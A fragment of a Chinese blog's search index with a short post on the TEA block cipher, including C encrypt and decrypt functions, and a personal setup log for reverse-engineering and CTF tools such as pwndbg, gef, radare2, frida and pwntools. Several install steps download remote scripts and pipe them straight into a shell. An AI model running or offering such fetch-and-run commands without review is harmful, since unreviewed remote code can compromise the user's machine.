文件\n","date":"2018-07-02T17:33:00+08:00","permalink":"https://ykiko.top/p/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%871/","title":"Android应用安全防护和逆向分析-基础篇1"},{"content":"TEA加密与解密 TEA加密与解密 TEA算法由剑桥大学计算机实验室的David Wheeler和Roger Needham于1994年发明。它是一种分组密码算法，其明文密文块为64比特，密钥长度为128比特。TEA算法利用不断增加的Delta(黄金分割率)值作为变化，使得每轮的加密是不同，该加密算法的迭代次数可以改变，建议的迭代次数为32轮。\n在游戏项目中，一般需要对资源或数据进行加密保护，最简单高效的加密算法就是采用位与或之类的，但是比较容易被人分析出来。 TEA加密算法不但比较简单，而且有很强的抗差分分析能力，加密速度也比较快。可以根据项目需求设置加密轮数来增加加密强度。主要运用了移位和异或运算。密钥在加密过程中始终不变。\n差分分析是一种选择明文攻击，其基本思想是：通过分析特定明文差分对相对应密文差分影响来获得尽可能大的密钥。它可以用来攻击任何由迭代一个固定的轮函数的结构的密码以及很多分组密码（包括DES），它是由Biham和Shamir于1991年提出的选择明文攻击。\n加密核心函数\n1 void EncryptTEA(unsigned int *firstChunk, unsigned int *secondChunk, unsigned int* key){ unsigned int y = *firstChunk; unsigned int z = *secondChunk; unsigned int sum = 0; unsigned int delta = 0x9e3779b9; for (int i = 0; i \u0026lt; 8; i++) //8轮运算(需要对应下面的解密核心函数的轮数一样) { sum += delta; y += ((z \u0026lt;\u0026lt; 4) + key[0]) ^ (z + sum) ^ ((z \u0026gt;\u0026gt; 5) + key[1]); z += ((y \u0026lt;\u0026lt; 4) + key[2]) ^ (y + sum) ^ ((y \u0026gt;\u0026gt; 5) + key[3]); } *firstChunk = y; *secondChunk = z;} 算法使用了一个神秘常数δ作为倍数，它来源于黄金比率，以保证每一轮加密都不相同。但δ的精确值似乎并不重要，这里 TEA 把它定义为 δ=「(√5 - 1)231」–\u0026gt; delta = 0x9e3779b9;\n解密核心函数\n1 void DecryptTEA(unsigned int *firstChunk, unsigned int *secondChunk, unsigned int* key){ unsigned int sum = 0; unsigned int y = *firstChunk; unsigned int z = *secondChunk; unsigned int delta = 0x9e3779b9; sum = delta \u0026lt;\u0026lt; 3; //32轮运算，所以是2的5次方；16轮运算，所以是2的4次方；8轮运算，所以是2的3次方 for (int i = 0; i \u0026lt; 8; i++) //8轮运算 { z -= (y \u0026lt;\u0026lt; 4) + key[2] ^ y + sum ^ (y \u0026gt;\u0026gt; 5) + key[3]; y -= (z \u0026lt;\u0026lt; 4) + key[0] ^ z + sum ^ (z \u0026gt;\u0026gt; 5) + key[1]; sum -= delta; } *firstChunk = y; *secondChunk = z;} ","date":"2018-01-17T00:00:00+08:00","permalink":"https://ykiko.top/p/tea%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86/","title":"TEA加密与解密"},{"content":"EnvRecord 用来不时记录平时所用环境配置，以及遇到的各种问题以及解决办法。主要是为了防丢失，以及总是和空气斗志斗勇。\nWin10 日常使用\nWSL 默认不是root 设置默认root用户。ubuntu config --default-user root\non my zsh 装上\n官方github\n需要先安装ZSH。\n安装on my zsh:\nvia curl：sh -c \u0026quot;$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)\u0026quot;\nvia wget: sh -c \u0026quot;$(wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)\u0026quot;\n然后配置喜欢的 插件+主题。vi ~/.zshrc 修改plugins属性\n必备插件git、autojump、zsh-autosuggestions。主题 经常使用ys\nGDB装上+pwndbg+peda+gef\nwsl的ubuntu不支持x86，所以主要只能调试x64的程序，而且可能会出现莫名其妙的错误。\n不过可以使用qemu来运行x86的程序，调试还是不行会出错。参考\n1 2 3 4 5 sudo apt update sudo apt install qemu-user-static sudo update-binfmts --install i386 /usr/bin/qemu-i386-static --magic \u0026#39;\\x7fELF\\x01\\x01\\x01\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x00\\x03\\x00\\x01\\x00\\x00\\x00\u0026#39; --mask \u0026#39;\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xfc\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xf8\\xff\\xff\\xff\\xff\\xff\\xff\\xff\u0026#39; # 运行下面的一条命令就行跑x86 不过每次打开wsl都得运行一次，很麻烦，可以写脚本自动开启。 sudo service binfmt-support start pwndbg+peda+gef\n三个都可能用到，三个工具特性不一样。各有强项，所以三个都装，使用脚本gdb.sh启动选项\n安装pwndbg:\n1 2 3 git clone https://github.com/pwndbg/pwndbg cd pwndbg ./setup.sh peda:\n1 2 git clone https://github.com/longld/peda.git ~/peda echo \u0026#34;source ~/peda/peda.py\u0026#34; \u0026gt;\u0026gt; ~/.gdbinit gef:\n1 2 3 4 5 6 # via the install script $ wget -q -O- https://github.com/hugsy/gef/raw/master/scripts/gef.sh | sh # manually $ wget -O ~/.gdbinit-gef.py -q https://github.com/hugsy/gef/raw/master/gef.py $ echo source ~/.gdbinit-gef.py \u0026gt;\u0026gt; ~/.gdbinit gdb.sh 把该文件放在/usr/local/sbin 参考\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 #!/bin/bash function Mode_change { name=$1 gdbinitfile=~/.gdbinit#这个路径按照你的实际情况修改# gdbinitfile=/root/Desktop/mode#路径按照你的实际情况修改 peda=\u0026#34;source ~/peda/peda.py\u0026#34; gef=\u0026#34;source ~/.gdbinit-gef.py\u0026#34; pwndbg=\u0026#34;source /home/pwndbg/gdbinit.py\u0026#34; sign=$(cat $gdbinitfile | grep -n \u0026#34;#this place is controled by user\u0026#39;s shell\u0026#34;) #此处上面的查找内容要和你自己的保持一致 pattern=\u0026#34;:#this place is controled by user\u0026#39;s shell\u0026#34; number=${sign%$pattern} location=$[number+2] parameter_add=${location}i parameter_del=${location}d message=\u0026#34;TEST\u0026#34; if [ $name -eq \u0026#34;1\u0026#34; ];then sed -i \u0026#34;$parameter_del\u0026#34; $gdbinitfile sed -i \u0026#34;$parameter_add $peda\u0026#34; $gdbinitfile echo -e \u0026#34;Please enjoy the peda!\\n\u0026#34; elif [ $name -eq \u0026#34;2\u0026#34; ];then sed -i \u0026#34;$parameter_del\u0026#34; $gdbinitfile sed -i \u0026#34;$parameter_add $gef\u0026#34; $gdbinitfile echo -e \u0026#34;Please enjoy the gef!\\n\u0026#34; else sed -i \u0026#34;$parameter_del\u0026#34; $gdbinitfile sed -i \u0026#34;$parameter_add $pwndbg\u0026#34; $gdbinitfile echo -e \u0026#34;Please enjoy the pwndbg!\\n\u0026#34; fi } echo -e \u0026#34;Please choose one mode of GDB?\\n1.peda 2.gef 3.pwndbg\u0026#34; read -p \u0026#34;Input your choice:\u0026#34; num if [ $num -eq \u0026#34;1\u0026#34; ];then Mode_change $num elif [ $num -eq \u0026#34;2\u0026#34; ];then Mode_change $num elif [ $num -eq \u0026#34;3\u0026#34; ];then Mode_change $num else echo -e \u0026#34;Error!\\nPleasse input right number!\u0026#34; fi gdb $1 $2 $3 $4 $5 $6 $7 $8 $9# r2全家桶 （逆向调试神器）\n1 2 3 git clone https://github.com/radare/radare2.git cd radare2 sys/install.sh#Install / Update gcc arm aarch aarch64\nsudo apt install gcc-arm-linux-gnueabi 使用命令arm-linux-gnueabi-gcc\nsudo apt install gcc-aarch64-linux-gnu 使用命令aarch64-linux-gnu-gcc\nclang+llvm\n方法一，手动编译安装，费时费力\n方法二 apt\n完整方法这个地址\n只写ubuntu 18,04\n编辑 /etc/apt/sources.list，添加源 1 2 3 4 5 6 7 8 9 # i386 not available deb http://apt.llvm.org/bionic/ llvm-toolchain-bionic main deb-src http://apt.llvm.org/bionic/ llvm-toolchain-bionic main # 7 deb http://apt.llvm.org/bionic/ llvm-toolchain-bionic-7 main deb-src http://apt.llvm.org/bionic/ llvm-toolchain-bionic-7 main # 8 deb http://apt.llvm.org/bionic/ llvm-toolchain-bionic-8 main deb-src http://apt.llvm.org/bionic/ llvm-toolchain-bionic-8 main 添加证书 1 2 wget -O - https://apt.llvm.org/llvm-snapshot.gpg.key|sudo apt-key add - # Fingerprint: 6084 F3CF 814B 57C1 CF12 EFD5 15CF 4D18 AF4F 7421 安装 版本8 1 2 3 4 5 6 7 8 9 10 11 12 13 14 # LLVM apt-get install libllvm-8-ocaml-dev libllvm8 llvm-8 llvm-8-dev llvm-8-doc llvm-8-examples llvm-8-runtime # Clang and co apt-get install clang-8 clang-tools-8 clang-8-doc libclang-common-8-dev libclang-8-dev libclang1-8 clang-format-8 python-clang-8 # libfuzzer apt-get install libfuzzer-8-dev # lldb apt-get install lldb-8 # lld (linker) apt-get install lld-8 # libc++ apt-get install libc++-8-dev libc++abi-8-dev # OpenMP apt-get install libomp-8-dev python3+pip\napt install python3 python3-pip、python-pip\npython库\nfrida （hook) 同win下使用\npwntools (py2)\ngmpy2 (py2-3)\nr2Frida\nBrida\nvscode （666） 主要是各种插件\nzh-ch （汉化包）\nbackground （右下角小萌人）\ncmder** (Win下强大的终端工具)** 官网下载安装\n简单配置：\nwsl vim 无法使用上下左右键解决\npy2-py3 官网找想要的包下载，同时装两个版本。\n修改环境变量，日常使用py3,把py3的环境变量放在前面，去py2的安装目录复制一份python.exe 更名为python2.exe，就可以使用python2作为命令输入。\npip配置为国内源会快很多\nJava8+jdk最新 官网下载安装\n下个jdk最新版防止部分工具需要。\n可能有时候还需要配置环境变量JAVA_HOME为JDK路径。\nGolang 也是只需下载安装就ok.\nNodeJS 也是只需下载安装就ok. 推荐稳定版。\n会默认安装npm，然而下载速度实在太慢，使用淘宝镜像cnpm ,用法相同\nnpm install -g cnpm --registry=https://registry.npm.taobao.org\ngit 官网下载安装完事\nYarn 官网下载安装完事\nCMake 下载安装ok\nhugo (博客工具) 下载exe到本地，配置环境变量\nHaskell Stack 官方文档、win直接下载安装\nStartlsBack (win下的美化工具) 下载安装 配置底部透明和居中\nNotepad++ (轻便的编辑器) 下载安装\nAndroid SDK 配置 adb工具 在目录platform-tools\nemulator、monitor 在tools下\nNDK-build 在ndk-bundle\nflutter (Google 跨平台框架) 有官网了\n下载SDK-\u0026gt;配置环境变量 flutter\\bin 。添加名为”PUB_HOSTED_URL”和”FLUTTER_STORAGE_BASE_URL”的条目。\nAndorid Studio设置\n安装插件\nFlutter插件： 支持Flutter开发工作流 (运行、调试、热重载等).\nDart插件： 提供代码分析 (输入代码时进行验证、代码补全等).\nVScode设置\n安装插件\nflutter Genymotion+逍遥Android (Android 模拟器) 下载安装ok\nCUDA （N卡xxx) 根据自己的显卡官网下载包\n根据需求安装。\n有个坑，如果为pytorch 或TensorFlow做前提 先看看这两支持的版本再安装相应的版本。\npytorch 需求前置环境也得装好 官方有很方便的安装方法 根据不同平台和环境\nTensorFlow 前置环境查官网 1 2 3 4 5 # GPU版本 py3 pip3 install tensorflow-gpu# stable pip3 install tf-nightly-gpu# preview pip3 install tensorflow-gpu==2.0.0-alpha0##TensorFlow 2.0 Alpha# CPU 版本 pip3 install --user --upgrade tensorflow tensorflow - 仅支持 CPU 的最新稳定版（建议新手使用）\ntensorflow-gpu - 支持 GPU 的最新稳定版（适用于 Ubuntu 和 Windows）\ntf-nightly - 仅支持 CPU 的预览每夜版（不稳定）\ntf-nightly-gpu - 支持 GPU 的预览每夜版（不稳定，适用于 Ubuntu 和 Windows）\ntensorflow==2.0.0-alpha0 - 仅支持 CPU 的预览 TF 2.0 Alpha 版（不稳定）\ntensorflow-gpu==2.0.0-alpha0 - 支持 GPU 的预览 TF 2.0 Alpha 版（不稳定，Ubuntu 和 Windows）\nVMware pro （虚拟机） 装MacOS记录 VBox （虚拟机） 安装拓展包 Xshell、Xftp (free for Home/School) free 的要去官网下载 填写信息，邮箱打开链接下载。\nTeamViewer (远程连接) 各种IDE、集成环境 只记录 Visual Studio 2019\nPycharm\nIDEA\n微信web开发工具\nphpStudy\nAndroid Studio (风扇~~ ~~)\nOther 不做记录\nUbuntu 18.04 一般用来调代码。 大部分配置同上面WSL,只记录不做过多介绍\non my zsh gdb+pwndbg+peda+gef 美化 manjaro 很喜欢的Linux发行版。基于ArchLinux，软件多，好看又好用。\nMac m2 没法用 放弃 等等 ","date":"0001-01-01T00:00:00Z","permalink":"https://ykiko.top/p/envrecord/","title":"EnvRecord"}]